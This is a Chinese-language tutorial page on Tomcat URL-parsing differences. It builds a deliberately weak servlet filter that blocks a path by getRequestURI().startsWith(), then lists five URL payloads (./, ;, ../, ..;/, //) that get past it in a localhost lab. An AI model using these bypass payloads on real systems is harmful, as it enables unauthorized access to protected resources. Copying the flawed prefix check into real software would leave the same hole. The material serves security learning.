<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="tomcat-url-解析差异性攻击利用"><span class="csB2D98684">Tomcat URL </span><span class="cs83F14626">解析差异性攻击利用</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">看个访问限制绕过的场景。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">假设</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">上启动的</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">目录下存在一个</span><span class="cs8926E06">info</span><span class="cs9C1B1871">目录，其中有一个</span><span class="cs8926E06">secret.jsp</span><span class="cs9C1B1871">文件，其中包含敏感信息等：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;html&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;head&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;title&gt;Secret&lt;/title&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/head&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">username: mi1k7ea&lt;br&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password: 123456&lt;br&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">address: china&lt;br&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">phone: 13666666666&lt;br&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/html&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">新建一个</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">包，其中新建一个</span><span class="cs8926E06">testFilter</span><span class="cs9C1B1871">类，实现</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">接口类：</span></p><p class="cs3A447A38"><span class="cs9FB05234">package filter;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import javax.servlet.*;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.http.*;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class testFilter implements Filter {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void init(FilterConfig filterConfig) throws ServletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String url = httpServletRequest.getRequestURI();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (url.startsWith(&quot;/urltest/info&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpServletResponse.getWriter().write(&quot;No Permission.&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterChain.doFilter(servletRequest, servletResponse);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void destroy() {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">作用是：只要访问</span><span class="cs8926E06">/urltest/info</span><span class="cs9C1B1871">目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用</span><span class="cs8926E06">getRequestURI()</span><span class="cs9C1B1871">函数来获取请求中的</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">目录路径，然后调用</span><span class="cs8926E06">startsWith()</span><span class="cs9C1B1871">函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">编辑</span><span class="cs8926E06">web.xml</span><span class="cs9C1B1871">，添加</span><span class="cs8926E06">testFilter</span><span class="cs9C1B1871">设置：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;version=&quot;4.0&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;filter&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;filter-name&gt;testFilter&lt;/filter-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;filter-class&gt;filter.testFilter&lt;/filter-class&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/filter&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;filter-mapping&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;filter-name&gt;testFilter&lt;/filter-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/filter-mapping&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/web-app&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行之后，访问</span><span class="cs9FB05234">http://localhost:8080/urltest/info/secret.jsp</span><span class="cs9C1B1871">，会显示无权限：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/Tomcat_URL_解析差异性导致的安全问题/调试分析/Tomcat%20URL%20%e8%a7%a3%e6%9e%90%e5%b7%ae%e5%bc%82%e6%80%a7%e6%94%bb%e5%87%bb%e5%88%a9%e7%94%a8_files/image0.png" width="560" height="162" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据前面的分析构造如下几个</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">都能成功绕过认证限制来访问：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://localhost:8080/urltest/./info/secret.jsp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://localhost:8080/urltest/mi1k7ea/..;/info/secret.jsp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://localhost:8080//urltest/info/secret.jsp</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/Tomcat_URL_解析差异性导致的安全问题/调试分析/Tomcat%20URL%20%e8%a7%a3%e6%9e%90%e5%b7%ae%e5%bc%82%e6%80%a7%e6%94%bb%e5%87%bb%e5%88%a9%e7%94%a8_files/image1.png" width="560" height="264" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">整个的过程大致如此，就是利用解析的差异性来绕过认证</span></p></body>
</html>
